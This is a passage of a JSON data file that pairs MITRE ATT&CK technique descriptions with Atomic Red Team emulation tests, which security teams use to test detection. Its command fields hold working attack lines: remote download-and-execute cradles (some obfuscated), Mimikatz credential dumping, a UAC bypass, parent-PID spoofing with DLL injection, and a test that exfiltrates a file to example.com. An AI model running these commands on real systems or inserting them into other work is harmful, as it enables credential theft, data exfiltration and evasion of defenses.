__FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n", "name": "powershell"}}]}, "T1072": {"name": "Software Deployment Tools", "technique_id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414", "external_id": "T1072", "data_components": ["Application Log Content", "Process Creation"], "kill_chain_phases": ["execution", "lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea", "course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).\n\nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.", "atomic_tests": [{"name": "Radmin Viewer Utility", "auto_generated_guid": "b4988cad-6ed2-434d-ace5-ea2670782129", "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n", "supported_platforms": ["windows"], "input_arguments": {"radmin_installer": {"description": "Radmin Viewer installer", "type": "path", "default": "RadminViewer.msi"}, "radmin_exe": {"description": "The radmin.exe executable from RadminViewer.msi", "type": "path", "default": "Radmin Viewer 3/Radmin.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Radmin Viewer Utility must be installed at specified location (#{radmin_exe})\n", "prereq_command": "if (Test-Path \"${env:ProgramFiles(x86)}/#{radmin_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Downloading radmin installer\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{radmin_installer}\"\nWrite-Host Install Radmin\nStart-Process msiexec  -Wait -ArgumentList /i , \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{radmin_installer}\", /qn\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "\"%PROGRAMFILES(x86)%/#{radmin_exe}\"\n"}}, {"name": "PDQ Deploy RAT", "auto_generated_guid": "e447b83b-a698-4feb-bed1-a7aaf45c3443", "description": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.\n", "supported_platforms": ["windows"], "input_arguments": {"PDQ_Deploy_installer": {"description": "PDQ Deploy Install", "type": "path", "default": "PDQDeploysetup.exe"}, "PDQ_Deploy_exe": {"description": "The PDQDeployConsole.exe executable from PDQDeploysetup.exe", "type": "path", "default": "Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PDQ Deploy will be installed at specified location (#{PDQ_Deploy_exe})\n", "prereq_command": "if (Test-Path \"${env:ProgramFiles(x86)}/#{PDQ_Deploy_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Downloading PDQ Deploy installer\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.pdq.com/release/19/Deploy_19.3.350.0.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{PDQ_Deploy_installer}\"\nWrite-Host Install PDQ Deploy\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\#{PDQ_Deploy_installer}\" -Wait -ArgumentList \"/s\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\"\n"}}]}, "T1041": {"name": "Exfiltration Over C2 Channel", "technique_id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d", "external_id": "T1041", "data_components": ["Network Traffic Content", "Network Traffic Flow", "File Access", "Network Connection Creation", "Command Execution"], "kill_chain_phases": ["exfiltration"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--65401701-019d-44ff-b223-08d520bb0e7b"], "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "atomic_tests": [{"name": "C2 Data Exfiltration", "auto_generated_guid": "d1253f6e-c29b-49dc-b466-2147a6191932", "description": "Exfiltrates a file present on the victim machine to the C2 server.\n", "supported_platforms": ["windows"], "input_arguments": {"destination_url": {"description": "Destination URL to post encoded data.", "type": "string", "default": "example.com"}, "filepath": {"description": "The file which is being exfiltrated to the C2 Server.", "type": "path", "default": "$env:TEMP\\LineNumbers.txt"}}, "executor": {"command": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive\n", "name": "powershell"}}]}, "T1134.004": {"name": "Parent PID Spoofing", "technique_id": "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a", "external_id": "T1134.004", "data_components": ["Process Creation", "OS API Execution", "Process Metadata"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)", "atomic_tests": [{"name": "Parent PID Spoofing using PowerShell", "auto_generated_guid": "069258f4-2162-46e9-9a25-c9c6c56150d2", "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n", "supported_platforms": ["windows"], "input_arguments": {"parent_process_name": {"description": "Name of the parent process", "type": "string", "default": "explorer"}, "spawnto_process_path": {"description": "Path of the process to spawn", "type": "path", "default": "C:\\Program Files\\Internet Explorer\\iexplore.exe"}, "dll_process_name": {"description": "Name of the created process from the injected dll", "type": "string", "default": "calculator"}, "dll_path": {"description": "Path of the dll to inject", "type": "path", "default": "PathToAtomicsFolder\\T1134.004\\bin\\calc.dll"}, "spawnto_process_name": {"description": "Name of the process to spawn", "type": "string", "default": "iexplore"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL to inject must exist on disk at specified location (#{dll_path})\n", "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll\" -OutFile \"#{dll_path}\"\n"}, {"description": "PPID.ps1 must exist on disk at $PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\n", "prereq_command": "if (Test-Path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1\" -OutFile \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n"}], "executor": {"command": ". \"$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "cleanup_command": "Stop-Process -Name \"#{dll_process_name}\" -ErrorAction Ignore\nStop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Parent PID Spoofing - Spawn from Current Process", "auto_generated_guid": "14920ebd-1d61-491a-85e0-fe98efe37f25", "description": "Spawns a powershell.exe process as a child of the current process.", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "File path or name of process to spawn", "type": "path", "default": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "parent_pid": {"description": "PID of process to spawn from", "type": "string", "default": "$PID"}, "command_line": {"description": "Specified command line to use", "type": "string", "default": "-Command Start-Sleep 10"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}", "name": "powershell"}}, {"name": "Parent PID Spoofing - Spawn from Specified Process", "auto_generated_guid": "cbbff285-9051-444a-9d17-c07cd2d230eb", "description": "Spawns a notepad.exe process as a child of the current process.", "supported_platforms": ["windows"], "input_arguments": {"parent_pid": {"description": "PID of process to spawn from", "type": "string", "default": "$PID"}, "test_guid": {"description": "Defined test GUID", "type": "string", "default": "12345678-1234-1234-1234-123456789123"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}", "name": "powershell"}}, {"name": "Parent PID Spoofing - Spawn from svchost.exe", "auto_generated_guid": "e9f2b777-3123-430b-805d-5cedc66ab591", "description": "Spawnd a process as a child of the first accessible svchost.exe process.", "supported_platforms": ["windows"], "input_arguments": {"command_line": {"description": "Specified command line to use", "type": "string", "default": "-Command Start-Sleep 10"}, "file_path": {"description": "File path or name of process to spawn", "type": "path", "default": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'", "name": "powershell"}}, {"name": "Parent PID Spoofing - Spawn from New Process", "auto_generated_guid": "2988133e-561c-4e42-a15f-6281e6a9b2db", "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.", "supported_platforms": ["windows"], "input_arguments": {"command_line": {"description": "Specified command line to use", "type": "string", "default": "-Command Start-Sleep 10"}, "file_path": {"description": "File path or name of process to spawn", "type": "path", "default": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "parent_name": {"description": "Parent process to spoof from", "type": "path", "default": "$Env:windir\\System32\\notepad.exe"}}, "dependencies": [{"description": "The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.", "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}", "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"}], "executor": {"command": "Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'", "name": "powershell"}}]}, "T1059.001": {"name": "PowerShell", "technique_id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736", "external_id": "T1059.001", "data_components": ["Process Metadata", "Script Execution", "Process Creation", "Command Execution", "Module Load"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)", "atomic_tests": [{"name": "Mimikatz", "auto_generated_guid": "f3132740-55bc-48c4-bcc0-758a459cd027", "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"mimurl": {"description": "Mimikatz url", "type": "url", "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"}}, "executor": {"command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Run BloodHound from local disk", "auto_generated_guid": "a21bb23e-e677-4ee7-af90-6931b57b6350", "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "SharpHound.ps1 must be located at \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\n"}], "executor": {"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5\n", "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n", "name": "powershell"}}, {"name": "Run Bloodhound from Memory using Download Cradle", "auto_generated_guid": "bf8c1441-4674-4dab-8e4e-39d93d08f9b7", "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "supported_platforms": ["windows"], "executor": {"command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n", "name": "powershell"}}, {"name": "Obfuscation Tests", "auto_generated_guid": "4297c41a-8168-4138-972d-01f3ee92c804", "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n", "supported_platforms": ["windows"], "executor": {"command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n", "name": "powershell"}}, {"name": "Mimikatz - Cradlecraft PsSendKeys", "auto_generated_guid": "af1800cf-9f9d-4fd1-a709-14b1e6de020d", "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n", "name": "powershell", "elevation_required": true}}, {"name": "Invoke-AppPathBypass", "auto_generated_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372", "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n", "supported_platforms": ["windows"], "executor": {"command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "name": "command_prompt"}}, {"name": "Powershell MsXml COM object - with prompt", "auto_generated_guid": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da", "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "url of payload to execute", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1"}}, "executor": {"command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "name": "command_prompt"}}, {"name": "Powershell XML requests", "auto_generated_guid": "4396927f-e503-427b-b023-31049b9b09a6", "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "url of payload to execute", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml"}}, "executor": {"command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n", "name": "command_prompt"}}, {"name": "Powershell invoke mshta.exe download", "auto_generated_guid": "8a2ad40b-12c7-4b25-8521-2737b0a415af", "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "url of payload to execute", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct"}}, "executor": {"command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n", "name": "command_prompt"}}, {"name": "Powershell Invoke-DownloadCradle", "auto_generated_guid": "cc50fa2a-a4be-42af-a88f-e347ba0bf4d7", "description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n", "supported_platforms": ["windows"], "executor": {"steps": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n", "name": "manual"}}, {"name": "PowerShell Fileless Script Execution", "auto_generated_guid": "fa050f5e-bc75-4230-af73-b6fd7852cd73", "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n", "supported_platforms": ["windows"], "executor": {"command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "cleanup_command": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "PowerShell Downgrade Attack", "auto_generated_guid": "9148e7c4-9356-420e-a416-e896e9c0f73e", "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n", "supported_platforms": ["windows"], "dependencies": [{"description": "PowerShell version 2 must be installed\n", "prereq_command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually\n"}], "executor": {"command": "powershell.exe -version 2 -Command Write-Host $PSVersion\n", "name": "powershell"}}, {"name": "NTFS Alternate Data Stream Access", "auto_generated_guid": "8e5c5532-1181-4c1d-bb79-b3a9f5dbd680", "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"ads_file": {"description": "File created to store Alternate Stream Data", "type": "string", "default": "$env:TEMP\\NTFS_ADS.txt"}}, "dependencies": [{"description": "Homedrive must be an NTFS drive\n", "prereq_command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \"NTFS\") {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Prereq's for this test cannot be met automatically\n"}], "executor": {"name": "powershell", "command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", "cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\n"}}, {"name": "PowerShell Session Creation and Use", "auto_generated_guid": "7c1acec2-78fa-4305-a3e0-db2a54cddecd", "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"hostname_to_connect": {"description": "The host to connect to, by default it will connect to the local machine", "type": "string", "default": "$env:COMPUTERNAME"}}, "dependencies": [{"description": "PSRemoting must be enabled\n", "prereq_command": "Try {\n    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 